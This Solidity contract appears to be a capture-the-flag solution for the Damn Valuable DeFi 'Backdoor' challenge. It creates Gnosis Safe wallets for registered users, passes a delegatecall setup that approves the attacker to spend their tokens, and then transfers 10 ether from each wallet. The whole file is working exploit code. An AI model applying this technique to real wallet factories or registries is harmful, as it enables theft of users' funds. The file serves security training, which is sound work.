// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

import "../DamnValuableToken.sol";

contract AttackBackdoor {

    address public owner;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token
    ){
        owner = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;
    }

    function setupToken(address _tokenAddress, address _attacker) external {
        //called during Gnosis Safe initiation
        //the attacker is being granted the approval to spend tokens by the proxy contract
        //proxy contract is going to delegate call this contract and run this function
        DamnValuableToken(_tokenAddress).approve(_attacker, 10 ether);
    }

    function exploit(address[] memory users, bytes memory setupData) external {
        for(uint i = 0; i < users.length; i++ ){
            address user = users[i];
            address[] memory victim = new address[](1);
            victim[0] = user;

            // Create ABI call for proxy
            // Calling the Gnosis Proxy setup function
            string memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory initGnosis = abi.encodeWithSignature(
                signatureString,
                victim,
                uint256(1), //THERSHOLD = 1
                address(this),//to address / what modules to be setup
                setupData, // setup data
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            //create a new Gnosis Wallet
            //walletRegistry is set as the callback to this function through proxyCreated
            //Anyone can create a Gnosis wallet on behalf of otehr users
            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory).createProxyWithCallback(
                masterCopy,
                initGnosis,
                69, //randomSalt
                IProxyCreationCallback(walletRegistry)
            );

            DamnValuableToken(token).transferFrom(address(newProxy), owner, 10 ether);

        }
    }
    
}